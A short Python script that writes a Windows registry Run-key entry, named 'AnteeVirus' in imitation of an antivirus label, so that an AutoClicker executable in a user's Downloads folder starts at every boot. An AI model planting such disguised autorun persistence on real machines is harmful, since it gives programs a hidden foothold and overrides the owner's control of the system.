import winreg as wrg

location = wrg.HKEY_LOCAL_MACHINE

soft = wrg.OpenKeyEx(location, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",access=wrg.KEY_WRITE)

wrg.SetValueEx(soft, f"AnteeVirus", 0, wrg.REG_SZ, 
               "C:\\Users\\User\\Download\\AutoClicker-3.0.exe") 